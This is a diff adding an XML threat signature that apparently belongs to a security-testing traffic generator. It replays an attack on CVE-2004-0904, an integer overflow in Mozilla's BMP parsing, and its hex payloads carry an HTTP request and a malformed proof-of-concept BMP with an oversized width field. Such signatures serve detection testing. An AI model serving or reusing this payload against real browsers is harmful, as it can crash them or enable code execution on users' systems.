@@ -1,0 +1,126 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Mozilla BMP Parsing Integer Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="A vulnerability exists in the way several versions of the Mozilla web browser parses BMP images. The browser is not equipped to handle a BMP image with an overly large width value. This vulnerability may be leveraged by an attacker to execute arbitrary code on a target user's system or create a denial of service condition. (IPv6 Version)"/>
+    <Intent display="true"/>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Mozilla_Foundation"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Mozilla_Foundation_Mozilla_Foundation_Mozilla_web_browser"/>
+      <item value="Mozilla_Foundation_Mozilla_Foundation_Firefox_web_browser"/>
+      <item value="Mozilla_Foundation_Mozilla_Foundation_Thunderbird"/>
+      <item value="Mozilla_Foundation_Mozilla_Foundation_Core"/>
+      <item value="Mozilla_Foundation_Mozilla_Foundation_FreeBSD"/>
+      <item value="Mozilla_Foundation_Mozilla_Foundation_Madrake_Linux"/>
+      <item value="Mozilla_Foundation_Mozilla_Foundation_NetBSD"/>
+      <item value="Mozilla_Foundation_Mozilla_Foundation_OpenBSD"/>
+      <item value="Mozilla_Foundation_Mozilla_Foundation_Red_Hat_Linux"/>
+      <item value="Mozilla_Foundation_Mozilla_Foundation_Suse_Linux"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Mozilla_Foundation_Mozilla_web_browser_0.x"/>
+      <item value="Mozilla_Foundation_Mozilla_web_browser_1.0"/>
+      <item value="Mozilla_Foundation_Mozilla_web_browser_1.1"/>
+      <item value="Mozilla_Foundation_Mozilla_web_browser_1.2"/>
+      <item value="Mozilla_Foundation_Mozilla_web_browser_1.3"/>
+      <item value="Mozilla_Foundation_Mozilla_web_browser_1.4"/>
+      <item value="Mozilla_Foundation_Mozilla_web_browser_1.5"/>
+      <item value="Mozilla_Foundation_Mozilla_web_browser_1.6"/>
+      <item value="Mozilla_Foundation_Mozilla_web_browser_1.7.1"/>
+      <item value="Mozilla_Foundation_Firefox_web_browser_0.9.x_and_prior"/>
+      <item value="Mozilla_Foundation_Thunderbird_0.x"/>
+      <item value="Mozilla_Foundation_Core_1"/>
+      <item value="Mozilla_Foundation_Core_2"/>
+      <item value="Mozilla_Foundation_FreeBSD_4"/>
+      <item value="Mozilla_Foundation_FreeBSD_4.9"/>
+      <item value="Mozilla_Foundation_FreeBSD_4.10"/>
+      <item value="Mozilla_Foundation_FreeBSD_5.0"/>
+      <item value="Mozilla_Foundation_FreeBSD_5.1"/>
+      <item value="Mozilla_Foundation_FreeBSD_5.2"/>
+      <item value="Mozilla_Foundation_FreeBSD_5.2.1"/>
+      <item value="Mozilla_Foundation_Madrake_Linux_9.0"/>
+      <item value="Mozilla_Foundation_Madrake_Linux_9.1"/>
+      <item value="Mozilla_Foundation_Madrake_Linux_9.2"/>
+      <item value="Mozilla_Foundation_NetBSD_1.6.1"/>
+      <item value="Mozilla_Foundation_NetBSD_1.6.2"/>
+      <item value="Mozilla_Foundation_OpenBSD_3.4"/>
+      <item value="Mozilla_Foundation_OpenBSD_3.5"/>
+      <item value="Mozilla_Foundation_Red_Hat_Linux_Enterprise_3"/>
+      <item value="Mozilla_Foundation_Red_Hat_Linux_7.2"/>
+      <item value="Mozilla_Foundation_Red_Hat_Linux_7.3"/>
+      <item value="Mozilla_Foundation_Red_Hat_Linux_8.0"/>
+      <item value="Mozilla_Foundation_Red_Hat_Linux_9"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20040917-01"/>
+    <CVEID display="true" value="CVE-2004-0904"/>
+    <bugtraqID display="true" value="11171"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="90066b9f5f29d9ac89059c543cd2cb49"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1225900665"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213652360" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="K"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="L"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="M"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="N"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="O"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="6B646CAE" AckNumber="12A24CDA" HeaderLength="05" WindowSize="4470" Checksum="0E22" UrgentPointer="0000" Options="" Payload="474554202F626D702F706F632E626D7020485454502F312E310D0A486F73743A2031302E322E312E3130310D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F77733B20553B2057696E646F7773204E5420352E303B20656E2D55533B2072763A312E3729204765636B6F2F32303034303730372046697265666F782F302E392E320D0A4163636570743A20746578742F786D6C2C6170706C69636174696F6E2F786D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C746578742F68746D6C3B713D302E392C746578742F706C61696E3B713D302E382C696D6167652F706E672C2A2F2A3B713D302E350D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C6465666C6174650D0A4163636570742D436861727365743A2049534F2D383835392D312C7574662D383B713D302E372C2A3B713D302E370D0A4B6565702D416C6976653A203330300D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="12A24CDA" AckNumber="6B646E45" HeaderLength="05" WindowSize="1920" Checksum="5F0A" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205361742C2031382053657020323030342030323A32373A343120474D540D0A5365727665723A204170616368652F322E302E343820284665646F7261290D0A4C6173742D4D6F6469666965643A205361742C2031382053657020323030342030323A32373A303820474D540D0A455461673A20223233633263352D3333362D34323433373030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203832320D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20696D6167652F626D700D0A0D0A424D36030000000000003600000028000000FFAAAA0A01000000010018000000000000030000120B0000120B000000000000000000001515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF1515AF" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
